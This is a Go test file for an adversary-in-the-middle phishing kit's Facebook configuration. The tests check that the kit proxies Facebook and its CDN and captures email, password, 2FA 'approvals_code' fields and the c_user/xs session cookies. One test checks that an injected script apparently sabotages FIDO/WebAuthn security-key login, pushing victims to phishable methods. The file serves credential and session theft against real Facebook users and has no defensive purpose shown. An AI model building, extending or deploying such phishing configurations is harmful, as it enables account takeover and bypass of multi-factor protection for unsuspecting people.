package core

import (
	"strings"
	"testing"
)

func TestFacebook_Load(t *testing.T) {
	pl := loadPhishlet(t, "facebook", "../phishlets/facebook.yaml", nil)
	if pl.Name != "facebook" {
		t.Errorf("name = %q, want facebook", pl.Name)
	}
}

func TestFacebook_ProxyHosts(t *testing.T) {
	pl := loadPhishlet(t, "facebook", "../phishlets/facebook.yaml", nil)
	if got := len(pl.proxyHosts); got < 4 {
		t.Errorf("proxy_hosts = %d, want >= 4", got)
	}
	found := false
	for _, h := range pl.proxyHosts {
		if h.phish_subdomain == "facebook" && h.is_landing {
			found = true
		}
	}
	if !found {
		t.Error("no landing proxy host with phish_sub 'facebook'")
	}
}

func TestFacebook_CDNOrigSub(t *testing.T) {
	pl := loadPhishlet(t, "facebook", "../phishlets/facebook.yaml", nil)
	// static.xx.fbcdn.net must be proxied — orig_sub 'static.xx' + domain 'fbcdn.net'
	found := false
	for _, h := range pl.proxyHosts {
		if h.orig_subdomain == "static.xx" && h.domain == "fbcdn.net" {
			found = true
			if h.phish_subdomain != "staticxx" {
				t.Errorf("CDN phish_sub = %q, want 'staticxx'", h.phish_subdomain)
			}
		}
	}
	if !found {
		t.Error("static.xx.fbcdn.net proxy host missing (orig_sub 'static.xx', domain 'fbcdn.net')")
	}
}

func TestFacebook_MobileHost(t *testing.T) {
	pl := loadPhishlet(t, "facebook", "../phishlets/facebook.yaml", nil)
	found := false
	for _, h := range pl.proxyHosts {
		if h.phish_subdomain == "mfb" && h.orig_subdomain == "m" {
			found = true
		}
	}
	if !found {
		t.Error("m.facebook.com proxy host ('mfb') missing")
	}
}

func TestFacebook_AuthTokens(t *testing.T) {
	pl := loadPhishlet(t, "facebook", "../phishlets/facebook.yaml", nil)
	tokens, ok := pl.cookieAuthTokens[".facebook.com"]
	if !ok {
		t.Fatal("auth_tokens missing for .facebook.com")
	}
	found := make(map[string]bool)
	for _, tok := range tokens {
		found[tok.name] = true
	}
	// c_user + xs is the critical authenticated session pair
	for _, required := range []string{"c_user", "xs"} {
		if !found[required] {
			t.Errorf("critical auth cookie %q missing", required)
		}
	}
}

func TestFacebook_Credentials(t *testing.T) {
	pl := loadPhishlet(t, "facebook", "../phishlets/facebook.yaml", nil)
	if pl.username.key_s != "email" {
		t.Errorf("username key = %q, want 'email'", pl.username.key_s)
	}
	// Facebook sends password as plain text — no client-side encryption
	if pl.password.key_s != "pass" {
		t.Errorf("password key = %q, want 'pass'", pl.password.key_s)
	}
	// 2FA code must be in custom fields
	found := false
	for _, f := range pl.custom {
		if f.key_s == "approvals_code" {
			found = true
		}
	}
	if !found {
		t.Error("2FA credential 'approvals_code' missing from custom fields")
	}
}

func TestFacebook_AuthUrls(t *testing.T) {
	pl := loadPhishlet(t, "facebook", "../phishlets/facebook.yaml", nil)
	for _, want := range []string{"/login/", "/checkpoint/", "/home.php"} {
		matched := false
		for _, re := range pl.authUrls {
			if re.MatchString(want) {
				matched = true
				break
			}
		}
		if !matched {
			t.Errorf("auth_url %q not matched by any auth_urls entry", want)
		}
	}
}

func TestFacebook_FidoJsInject(t *testing.T) {
	pl := loadPhishlet(t, "facebook", "../phishlets/facebook.yaml", nil)
	if len(pl.js_inject) == 0 {
		t.Fatal("js_inject section is empty")
	}
	js := pl.js_inject[0]
	if len(js.trigger_domains) == 0 || js.trigger_domains[0] != "www.facebook.com" {
		t.Errorf("js_inject trigger_domain = %v, want [www.facebook.com]", js.trigger_domains)
	}
	for _, sym := range []string{"PublicKeyCredential", "navigator.credentials.get", "NotAllowedError"} {
		if !strings.Contains(js.script, sym) {
			t.Errorf("js_inject script missing symbol %q", sym)
		}
	}
}

func TestFacebook_SubFilters(t *testing.T) {
	pl := loadPhishlet(t, "facebook", "../phishlets/facebook.yaml", nil)
	// Both main and mobile origin must have sub_filters
	for _, host := range []string{"www.facebook.com", "m.facebook.com"} {
		sfs, ok := pl.subfilters[host]
		if !ok {
			t.Errorf("no subfilters for %s", host)
			continue
		}
		if len(sfs) < 3 {
			t.Errorf("subfilters for %s = %d, want >= 3", host, len(sfs))
		}
	}
}
